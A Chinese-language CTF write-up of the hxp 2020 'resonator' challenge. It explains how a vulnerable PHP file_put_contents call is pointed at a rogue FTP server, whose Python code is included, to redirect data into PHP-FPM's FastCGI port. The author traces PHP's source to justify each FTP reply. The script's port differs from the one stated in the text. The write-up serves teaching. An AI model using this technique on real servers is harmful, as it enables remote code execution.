> 原文链接: https://www.anquanke.com//post/id/226750 


# hxp2020的resonator题解分析


                                阅读量   
                                **148735**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t01f4801d3c7c2839be.jpg)](https://p5.ssl.qhimg.com/t01f4801d3c7c2839be.jpg)



[https://2020.ctf.link/internal/challenge/cb926472-66b2-4212-af86-b4aaf675d6ea/](https://2020.ctf.link/internal/challenge/cb926472-66b2-4212-af86-b4aaf675d6ea/)

<a class="reference-link" name="%E8%BF%99%E4%B8%AA%E9%A2%98%E6%88%91%E6%84%9F%E8%A7%89%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%EF%BC%8C%E7%BD%91%E4%B8%8A%E6%B2%A1%E6%9C%89%E6%89%BE%E5%88%B0wp%EF%BC%8C%E6%89%80%E4%BB%A5%E6%9D%A5%E5%86%99%E4%B8%80%E4%B8%8Bwp%EF%BC%8C%E9%A2%98%E7%9B%AE%E7%BB%99%E4%BA%86%E7%8E%AF%E5%A2%83%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%B3%A8%E6%84%8F%E5%88%B0%E7%BB%99%E7%9A%84www.conf%E9%87%8C%E7%9A%84fpm%E6%98%AF%E7%9B%91%E5%90%AC%E7%9A%849000%E7%AB%AF%E5%8F%A3%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%92%8C%E4%B9%8B%E5%89%8D%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9Bfastcgi%E7%9A%84%E6%94%BB%E5%87%BB%E6%9C%89%E5%85%B3"></a>这个题我感觉很有意思，网上没有找到wp，所以来写一下wp，题目给了环境，可以注意到给的www.conf里的fpm是监听的9000端口，也就是和之前遇到的一些fastcgi的攻击有关

[![](https://p2.ssl.qhimg.com/t0143533af4ee4b2a20.png)](https://p2.ssl.qhimg.com/t0143533af4ee4b2a20.png)

题目也非常简单，代码就5行，就`file_put_contents`和`file_get_contents`，这个有什么办法可以rce吗？仅仅从php的代码来看，看不出什么漏洞，那就只有看看php的源代码了

```
&lt;?php
$file = $_GET['file'] ?? '/tmp/file';
$data = $_GET['data'] ?? ':)';
file_put_contents($file, $data);
echo file_get_contents($file);
```



## 解题

<a class="reference-link" name="%E8%BF%99%E9%87%8C%E5%85%88%E7%BB%99%E5%87%BApoc%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AD%A5%E5%85%88%E7%94%9F%E6%88%90fastcgi%E7%9A%84%E6%94%BB%E5%87%BBpoc%EF%BC%9A"></a>这里先给出poc和利用方法，第一步先生成fastcgi的攻击poc：

[![](https://p0.ssl.qhimg.com/t01391d7d1aa7690aa6.png)](https://p0.ssl.qhimg.com/t01391d7d1aa7690aa6.png)

<a class="reference-link" name="%E7%AC%AC%E4%BA%8C%E6%AD%A5%E5%9C%A8%E8%87%AA%E5%B7%B1%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E9%9D%A2%E6%90%AD%E5%A5%BD%E6%81%B6%E6%84%8F%E7%9A%84ftp%E6%9C%8D%E5%8A%A1%E5%B9%B6%E4%B8%94%E7%9B%91%E5%90%AC2333%E7%AB%AF%E5%8F%A3%EF%BC%9A"></a>第二步在自己服务器上面搭好恶意的ftp服务并且监听2333端口：

```
import socket

host = '0.0.0.0'
port = 23
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

conn, address = sk.accept()
conn.send("200 \n")
print '200'
print conn.recv(20)

conn.send("200 \n")
print '200'
print conn.recv(20)

conn.send("200 \n")
print '200'
print conn.recv(20)

conn.send("300 \n")
print '300'
print conn.recv(20)

conn.send("200 \n")
print '200'
print conn.recv(20)
print "ck"
conn.send("227 127,0,0,1,8,6952\n")
print '200'
print conn.recv(20)

conn.send("150 \n")
print '150'
print conn.recv(20)
conn.close()
exit()
```

[![](https://p2.ssl.qhimg.com/t0174555ed28e7fd867.png)](https://p2.ssl.qhimg.com/t0174555ed28e7fd867.png)

[![](https://p4.ssl.qhimg.com/t01ab99fa87343ddcb8.png)](https://p4.ssl.qhimg.com/t01ab99fa87343ddcb8.png)

<a class="reference-link" name="%E7%AC%AC%E4%B8%89%E6%AD%A5%E5%8F%91%E9%80%81%E6%95%B4%E4%BD%93%E7%9A%84payload%E5%BE%97%E5%88%B0flag%EF%BC%8C%E8%BF%99%E9%87%8C%E7%9A%84payload%E6%98%AFgopherus%E7%94%9F%E6%88%90%E7%9A%84poc%E4%BB%8Egopher://127.0.0.1:9000/_%E4%B9%8B%E5%90%8E%E5%BC%80%E5%A7%8B%E5%8F%96%E7%9A%84%EF%BC%9A"></a>第三步发送整体的payload得到flag，这里的payload是gopherus生成的poc从gopher://127.0.0.1:9000/_之后开始取的：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e468d19e7c09b088.png)

[![](https://p4.ssl.qhimg.com/t01c2c6693493debd07.png)](https://p4.ssl.qhimg.com/t01c2c6693493debd07.png)



## 分析做题的过程和思路

<a class="reference-link" name="%E7%8E%B0%E5%9C%A8%E6%9D%A5%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8Bphp%E7%9A%84%E6%BA%90%E7%A0%81%E5%90%A7%EF%BC%8C%E8%B0%83%E8%AF%95php%E7%9A%84c%E6%BA%90%E7%A0%81%E8%BF%99%E4%B8%AA%E5%BA%94%E8%AF%A5%E9%83%BD%E6%B2%A1%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%BB%8Eftp%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%E7%9A%84%E5%9C%B0%E6%96%B9%E5%BC%80%E5%A7%8B%EF%BC%8C%E6%88%91%E9%80%89%E6%8B%A9%E7%9A%84%E6%98%AF%E5%9C%A8window%E4%B8%8B%E9%9D%A2%E9%99%84%E5%8A%A0%E5%88%B0php%E7%9A%84http%E6%9C%8D%E5%8A%A1%EF%BC%8C%E4%B8%8B%E9%9D%A2%E6%98%AFindex.php%E7%9A%84%E4%BB%A3%E7%A0%81"></a>现在来分析一下php的源码吧，调试php的c源码这个应该都没有问题，直接从ftp协议解析的地方开始，我选择的是在window下面附加到php的http服务，下面是index.php的代码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015a383e7014f5a401.png)

<a class="reference-link" name="%E7%84%B6%E5%90%8E%E5%88%86%E6%9E%90%E8%B5%B0%E5%88%B0ftp%E5%8D%8F%E8%AE%AE%E6%97%B6%E5%8F%AF%E4%BB%A5%E5%B9%B2%E4%B8%80%E4%BA%9B%E4%BB%80%E4%B9%88%EF%BC%8C%E9%A6%96%E5%85%88%E6%96%AD%E7%82%B9%E5%9C%A8%E8%BF%9E%E6%8E%A5tcp%E4%B9%8B%E5%90%8E%EF%BC%8C%E5%9C%A8tcp%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E4%BB%96%E4%BC%9A%E5%BE%97%E5%88%B0%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E8%BF%94%E5%9B%9E%E5%86%85%E5%AE%B9%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%86%85%E5%AE%B9%E6%98%AF200%E5%88%B0299%E7%9B%B4%E6%8E%A5%E5%B0%B1%E4%B8%8D%E4%BC%9A%E6%8A%A5%E9%94%99%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%B0%B1%E8%BF%94%E5%9B%9E%E6%BB%A1%E8%B6%B3%E4%BB%96%E7%9A%84%E6%9D%A1%E4%BB%B6%E7%9A%84%E5%80%BC%E5%B0%B1%E8%A1%8C"></a>然后分析走到ftp协议时可以干一些什么，首先断点在连接tcp之后，在tcp连接成功后，他会得到服务端的返回内容，如果内容是200到299直接就不会报错，所以我们恶意服务器就返回满足他的条件的值就行

[![](https://p2.ssl.qhimg.com/t01f4bcf8bb91a9e3d7.png)](https://p2.ssl.qhimg.com/t01f4bcf8bb91a9e3d7.png)

<a class="reference-link" name="%E7%BB%A7%E7%BB%AD%E8%B7%9F%E8%B8%AA%E5%8F%91%E7%8E%B0%E8%BF%99%E9%87%8C%E5%BE%97%E5%88%B0%E7%9A%84%E8%BF%94%E5%9B%9E%E5%86%85%E5%AE%B9"></a>继续跟踪发现这里得到的返回内容

[![](https://p0.ssl.qhimg.com/t0150cf0df0753c24dd.png)](https://p0.ssl.qhimg.com/t0150cf0df0753c24dd.png)

这里也就是为什么要是`200 \n`了，第4个字符必须得是空格才会结束不然就一直循环了

[![](https://p0.ssl.qhimg.com/t0127a57a7609a3baa8.png)](https://p0.ssl.qhimg.com/t0127a57a7609a3baa8.png)

<a class="reference-link" name="%E7%84%B6%E5%90%8E%E4%B9%9F%E5%B0%B1%E5%88%B0%E4%BA%86%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%88%A4%E6%96%AD%EF%BC%8C%E8%BF%99%E9%87%8C%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%BC%9A%E6%9C%89%E5%AF%86%E7%A0%81%EF%BC%8C%E4%BD%86%E6%98%AF%E4%B9%9F%E5%BF%85%E9%A1%BB%E6%98%AF200%E5%88%B0299%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E4%B8%BA200%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%87"></a>然后也就到了第二个判断，这里判断是否会有密码，但是也必须是200到299，所以我们为200也可以过

[![](https://p3.ssl.qhimg.com/t013fcef4bb1defb4d7.png)](https://p3.ssl.qhimg.com/t013fcef4bb1defb4d7.png)

[![](https://p3.ssl.qhimg.com/t01115b7daabd524865.png)](https://p3.ssl.qhimg.com/t01115b7daabd524865.png)

<a class="reference-link" name="%E7%84%B6%E5%90%8E%E5%B0%B1%E5%88%B0%E4%BA%86%E7%AC%AC%E4%B8%89%E4%B8%AA%E5%88%A4%E6%96%AD%EF%BC%8C%E4%B8%BA200%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%BF%87"></a>然后就到了第三个判断，为200也可以过

[![](https://p3.ssl.qhimg.com/t012118a576e6e235a8.png)](https://p3.ssl.qhimg.com/t012118a576e6e235a8.png)

第四个判断就得300了，因为`allow_overwrite`不为真

[![](https://p4.ssl.qhimg.com/t01357e44cce9abe124.png)](https://p4.ssl.qhimg.com/t01357e44cce9abe124.png)

[![](https://p4.ssl.qhimg.com/t01bc28c739847ff234.png)](https://p4.ssl.qhimg.com/t01bc28c739847ff234.png)

<a class="reference-link" name="%E5%B0%B1%E5%88%B0%E4%BA%86%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%88%A4%E6%96%AD%E4%BA%86%EF%BC%8C%E8%BF%99%E6%AC%A1%E5%B0%B1%E5%BE%97%E4%B8%BA200%EF%BC%8C%E4%B8%8D%E7%84%B6%E5%B0%B1%E4%BC%9A%E8%BF%9B%E5%85%A5ipv6%E7%9A%84%E8%A7%A3%E6%9E%90"></a>就到了第五个判断了，这次就得为200，不然就会进入ipv6的解析

[![](https://p5.ssl.qhimg.com/t0140c0581a9e7bf699.png)](https://p5.ssl.qhimg.com/t0140c0581a9e7bf699.png)

<a class="reference-link" name="%E7%AC%AC%E5%85%AD%E4%B8%AA%E5%88%A4%E6%96%AD%E4%BA%86%EF%BC%8C%E8%BF%99%E6%AC%A1%E5%B0%B1%E5%BE%97%E4%B8%BA227%E5%B9%B6%E4%B8%94%E5%90%8E%E9%9D%A2%E5%BE%97%E6%9C%89%E7%AC%A6%E5%90%88%E6%9D%A1%E4%BB%B6%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%BB%96%E4%BC%9A%E6%8A%8A%E5%90%8E%E9%9D%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E4%B8%BAip%E5%92%8C%E7%AB%AF%E5%8F%A3"></a>第六个判断了，这次就得为227并且后面得有符合条件的字符串，因为他会把后面的字符串解析为ip和端口

[![](https://p1.ssl.qhimg.com/t01b06a4d9f7752dc4a.png)](https://p1.ssl.qhimg.com/t01b06a4d9f7752dc4a.png)

这也是为什么poc里面的是`,`为ip地址的分隔，先解析ip，得到ip为`127.0.0.1`

[![](https://p2.ssl.qhimg.com/t01336ef8363084764e.png)](https://p2.ssl.qhimg.com/t01336ef8363084764e.png)

[![](https://p1.ssl.qhimg.com/t01bbeb5d295a0da810.png)](https://p1.ssl.qhimg.com/t01bbeb5d295a0da810.png)

<a class="reference-link" name="%E7%BB%8F%E8%BF%87%E6%B5%8B%E8%AF%95%E8%AE%A1%E7%AE%97%E5%8F%91%E7%8E%B0%E4%B8%BA6952%E5%90%8E%E5%B0%B1%E4%BC%9A%E5%BE%97%E5%88%B09000%E7%9A%84%E7%AB%AF%E5%8F%A3"></a>经过测试计算发现为6952后就会得到9000的端口

[![](https://p3.ssl.qhimg.com/t019cee40b3f5a8735b.png)](https://p3.ssl.qhimg.com/t019cee40b3f5a8735b.png)

<a class="reference-link" name="%E7%84%B6%E5%90%8E%E5%B0%B1%E4%BC%9A%E4%BB%8E%E8%A7%A3%E6%9E%90%E7%9A%84ip%E5%92%8C%E7%AB%AF%E5%8F%A3%E8%BF%9B%E8%A1%8C%E5%86%99%E5%85%A5%E6%95%B0%E6%8D%AE"></a>然后就会从解析的ip和端口进行写入数据

[![](https://p2.ssl.qhimg.com/t0197d7490409bf153c.png)](https://p2.ssl.qhimg.com/t0197d7490409bf153c.png)

<a class="reference-link" name="%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%9C%A8window%E4%B8%8A%E9%9D%A2%E7%9B%91%E5%90%AC9000%E7%AB%AF%E5%8F%A3"></a>所以我们在window上面监听9000端口

[![](https://p3.ssl.qhimg.com/t0129857a76928335df.png)](https://p3.ssl.qhimg.com/t0129857a76928335df.png)

<a class="reference-link" name="%E7%84%B6%E5%90%8E%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%88%90%E5%8A%9F%E5%BB%BA%E7%AB%8B%E4%BA%86socket%E8%BF%9E%E6%8E%A5"></a>然后继续执行，发现成功建立了socket连接

[![](https://p0.ssl.qhimg.com/t0199820ac15756d3d4.png)](https://p0.ssl.qhimg.com/t0199820ac15756d3d4.png)

[![](https://p3.ssl.qhimg.com/t0175a6c9a8f7f22285.png)](https://p3.ssl.qhimg.com/t0175a6c9a8f7f22285.png)

<a class="reference-link" name="%E7%84%B6%E5%90%8E%E5%88%B0%E4%BA%86%E7%AC%AC%E4%B8%83%E4%B8%AA%E5%88%A4%E6%96%AD%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%B8%BA150%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C"></a>然后到了第七个判断，直接为150就可以继续执行

[![](https://p4.ssl.qhimg.com/t01f4472b9703374347.png)](https://p4.ssl.qhimg.com/t01f4472b9703374347.png)

然后就会把写入的句柄交到新的tcp连接上面，剩下的就是一气呵成了，然后就可以看到我们收到的数据和`file_put_contents`里面写入的一样

[![](https://p4.ssl.qhimg.com/t01b4a2d8f016e53ed6.png)](https://p4.ssl.qhimg.com/t01b4a2d8f016e53ed6.png)

<a class="reference-link" name="%E6%80%BB%E7%BB%93%EF%BC%9A%E6%84%9F%E8%A7%89%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AAweb%E6%89%8B%E8%BF%98%E6%98%AF%E5%BE%97%E5%A4%9A%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%E5%85%B3%E4%BA%8E%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E7%9A%84%E6%9E%84%E9%80%A0%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%8F%AF%E8%83%BD%E5%B0%B1%E4%BC%9A%E5%8F%91%E7%8E%B0%E6%9B%B4%E5%A4%9A%E7%9A%84%E7%89%B9%E6%80%A7%E5%92%8C%E6%8A%80%E5%B7%A7%E3%80%82"></a>总结：感觉作为一个web手还是得多了解一下关于语言底层的构造，这样可能就会发现更多的特性和技巧。
